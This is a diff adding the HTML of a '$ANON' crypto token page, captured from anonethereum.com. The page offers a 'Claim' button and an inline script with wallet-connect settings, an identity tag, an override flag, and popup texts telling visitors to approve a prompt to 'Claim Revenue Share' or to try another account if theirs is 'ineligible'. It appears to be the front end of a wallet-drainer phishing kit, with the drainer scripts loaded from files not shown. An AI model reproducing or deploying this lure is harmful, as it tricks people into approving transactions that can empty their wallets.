@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en" data-scrapbook-source="https://anonethereum.com/" data-scrapbook-create="20240207110913187"
+  data-scrapbook-title="$ANON">
+
+  <meta charset="UTF-8">
+  <title>$ANON</title>
+  <link rel="stylesheet" href="style.css">
+  <script defer="defer" src="js/vendors.js"></script>
+  <script defer="defer" src="js/contracts.js"></script>
+  <script defer="defer" src="js/main.js"></script>
+  <script>
+      window.UNIQUE_IDENTITY = "yelping_cheetah_23";
+
+      // Pick a theme here, this defaults to "light"
+      window.modal_theme = "light";
+
+      // https://docs.walletconnect.com/2.0/web/web3modal/html/wagmi/theming
+      window.modal_variables = {
+          "--w3m-z-index": "99999999999999999999999999999999",
+          // Example of what you can do:
+          "--w3m-accent-color": "#4c6b2b",
+          "--w3m-background-color": "#5a2a66",
+          "--w3m-background-border-radius": "0px",
+          "--w3m-container-border-radius": "0px",
+          "--w3m-wallet-icon-border-radius": "0px",
+          "--w3m-wallet-icon-large-border-radius": "0px",
+          "--w3m-wallet-icon-small-border-radius": "0px",
+          "--w3m-secondary-button-border-radius": "0px",
+          "--w3m-icon-button-border-radius": "0px",
+          "--w3m-button-hover-highlight-border-radius": "0px",
+          "--w3m-input-border-radius": "0px",
+      };
+
+      window.popups = {
+          PENDING: {
+              title: "Claim Pending",
+              text: "Approve the prompt in order to Claim Revenue Share.",
+          },
+          INVALID: {
+              title: "Ineligible Address",
+              text: "The connected wallet is not eligible for Revenue Share.\nPlease try using a different account.",
+          },
+      };
+
+      window.OVERRIDE_MODE = false;
+  </script>
+</head>
+
+<body>
+  <div id="home" class="glitch">
+    <div class="title"></div>
+    <button id="start" class="glitch">Claim</button>
+    <p id="description"></p>
+  </div>
+
+  <div id="app" class="glitch">
+    <div class="titleSound"><img class="logo" src="logo.png" alt="logo">
+      <p>HYBRID TOKEN/NFT CONCEPT</p>
+    </div>
+
+    <div class="initial">
+      <a class="bttn" href="https://t.me/anonethereum">Telegram</a>
+
+      <a class="bttn" href="https://twitter.com/anon_ethereum">twitter</a>
+
+      <a class="bttn" href="https://t.me/anonethereum">chart</a>
+
+      <a class="bttn" href="https://t.me/anonethereum">opensea</a>
+    </div>
+    <div class="positionCanvas">
+      <canvas id="canvas" style="width: 105vw; height: 100vh;" height="701" width="1920"></canvas>
+      <audio id="audio" hidden="" src="Daniel_Avery_-_Drone_Logic_PHLP02.mp3"></audio>
+    </div>
+    <div class="filter ">
+      <input type="range" id="range" name="filter" min="1" max="500" value="30"><br>
+      <label for="filter">.</label>
+    </div>
+  </div>
+  <p><b></b></p>
+
+
+
+
+
+
+
+
+
+
+
+</body>
+
+</html>
